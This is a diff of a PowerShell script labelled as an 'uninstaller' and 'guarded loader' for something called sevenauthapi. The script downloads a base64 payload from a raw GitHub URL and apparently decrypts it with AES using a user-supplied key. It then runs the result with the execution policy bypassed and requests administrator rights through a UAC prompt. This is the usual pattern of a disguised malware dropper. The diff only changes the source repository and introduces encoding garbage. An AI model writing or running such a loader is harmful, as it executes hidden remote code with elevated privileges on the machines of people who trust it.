@@ -1,4 +1,4 @@
-# sevenauthapi uninstaller — guarded loader
+﻿# sevenauthapi uninstaller â€” guarded loader
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -6,10 +6,10 @@ $key = $env:SEVEN_KEY
 if (-not $key) { $key = Read-Host 'Key' }
 if (-not $key) { throw 'bla key' }
 
-$url = 'https://raw.githubusercontent.com/MarcoCOdev1/d/main/u.bin?t=' + [DateTime]::UtcNow.Ticks
+$url = 'https://raw.githubusercontent.com/MarcoCOdev1/dd/main/u.bin?t=' + [DateTime]::UtcNow.Ticks
 $res = Invoke-WebRequest -UseBasicParsing $url
 $b64 = if ($res.Content -is [byte[]]) { [Text.Encoding]::ASCII.GetString($res.Content) } else { $res.Content }
-try { $raw = [Convert]::FromBase64String($b64) } catch { throw 'payload kharban (cache?) — 3awd' }
+try { $raw = [Convert]::FromBase64String($b64) } catch { throw 'payload kharban (cache?) â€” 3awd' }
 
 $sha = [Security.Cryptography.SHA256]::Create()
 $a   = [Security.Cryptography.Aes]::Create()
@@ -28,5 +28,5 @@ $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 if ($admin) { & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp }
 else {
     Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$tmp`"")
-    Write-Host 'UAC tlob — 9bel w kemmel f l window jdida.' -ForegroundColor Yellow
+    Write-Host 'UAC tlob â€” 9bel w kemmel f l window jdida.' -ForegroundColor Yellow
 }
